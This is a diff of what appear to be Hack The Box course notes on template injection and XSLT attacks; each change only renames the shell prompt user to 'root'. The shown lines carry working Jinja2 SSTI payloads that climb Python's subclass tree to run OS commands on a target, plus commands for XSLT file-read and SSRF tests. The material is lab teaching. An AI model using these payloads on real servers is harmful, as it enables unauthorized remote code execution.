-AbdulrahmanTamim@htb[/htb]$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%20%7D%7D"
+root@htb[/htb]$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%20%7D%7D"
 
 <SNIP>
 <body>
@@ -2429,7 +2429,7 @@ Let us print out the number and the method names using the following payload.
 ```
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%25%20for%20i%20in%20range%28450%29%20%25%7D%20%7B%7B%20i%20%7D%7D%20%7B%7B%20%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5Bi%5D.__name__%20%7D%7D%20%7B%25%20endfor%20%25%7D"
+root@htb[/htb]$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%25%20for%20i%20in%20range%28450%29%20%25%7D%20%7B%7B%20i%20%7D%7D%20%7B%7B%20%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5Bi%5D.__name__%20%7D%7D%20%7B%25%20endfor%20%25%7D"
 
 <SNIP>
 <body>
@@ -2456,7 +2456,7 @@ We have everything we need to construct an RCE payload, such as the following.
 ```
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B214%5D%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.system%28%22touch%20%2Ftmp%2Ftest1%22%29%20%7D%7D"
+root@htb[/htb]$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B214%5D%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.system%28%22touch%20%2Ftmp%2Ftest1%22%29%20%7D%7D"
 
 <SNIP>
 <body>
@@ -2483,7 +2483,7 @@ We can identify if `test1` was created using the following payload.
 ```
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B214%5D%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.popen%28%27ls%20%2Ftmp%27%29.read%28%29%7D%7D"
+root@htb[/htb]$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B214%5D%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.popen%28%27ls%20%2Ftmp%27%29.read%28%29%7D%7D"
 
 <SNIP>
 <body>
@@ -2540,7 +2540,7 @@ First, install the required packages on Pwnbox or a local VM, as follows:
 &#x20; Attacking XSLT
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo apt install default-jdk libsaxon-java libsaxonb-java
+root@htb[/htb]$ sudo apt install default-jdk libsaxon-java libsaxonb-java
 ```
 
 Next, create the following files:
@@ -2806,7 +2806,7 @@ To see the results, we will use the command line parser. This can be done as fol
 &#x20; Attacking XSLT
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ saxonb-xslt -xsl:transformation.xsl catalogue.xml
+root@htb[/htb]$ saxonb-xslt -xsl:transformation.xsl catalogue.xml
 
 Warning: at xsl:stylesheet on line 3 column 50 of transformation.xslt:
   Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
@@ -2849,7 +2849,7 @@ Let us now run the previous command, but this time, using the detection.xsl file
 **Transformation through the terminal**
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ saxonb-xslt -xsl:detection.xsl catalogue.xml
+root@htb[/htb]$ saxonb-xslt -xsl:detection.xsl catalogue.xml
 
 Warning: at xsl:stylesheet on line 2 column 80 of detection.xsl:
   Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
@@ -2873,7 +2873,7 @@ Based on the preprocessor, we can go to the XSLT documentation for this version 
 **Transformation through the terminal**
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ saxonb-xslt -xsl:readfile.xsl catalogue.xml
+root@htb[/htb]$ saxonb-xslt -xsl:readfile.xsl catalogue.xml
 
 Warning: at xsl:stylesheet on line 1 column 111 of readfile.xsl:
   Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
@@ -2910,7 +2910,7 @@ We can also mount SSRF attacks if we have control over the transformation.
 **Transformation through the terminal**
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ saxonb-xslt -xsl:ssrf.xsl catalogue.xml
+root@htb[/htb]$ saxonb-xslt -xsl:ssrf.xsl catalogue.xml
 
 Warning: at xsl:stylesheet on line 1 column 111 of ssrf.xsl:
   Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
@@ -2920,7 +2920,7 @@ Failed to compile stylesheet. 1 error detected.
 ```
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ saxonb-xslt -xsl:ssrf.xsl catalogue.xml
+root@htb[/htb]$ saxonb-xslt -xsl:ssrf.xsl catalogue.xml
 
 Warning: at xsl:stylesheet on line 1 column 111 of ssrf.xsl:
   Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
@@ -2966,7 +2966,7 @@ We presented some tech-stack-identification XSL files at the beginning of this s
 **Transformation through the terminal**
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ saxonb-xslt -xsl:fingerprinting.xsl catalogue.xml
+root@htb[/htb]$ saxonb-xslt -xsl:fingerprinting.xsl catalogue.xml
 
 Warning: at xsl:stylesheet on line 2 column 80 of fingerprinting.xsl:
   Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
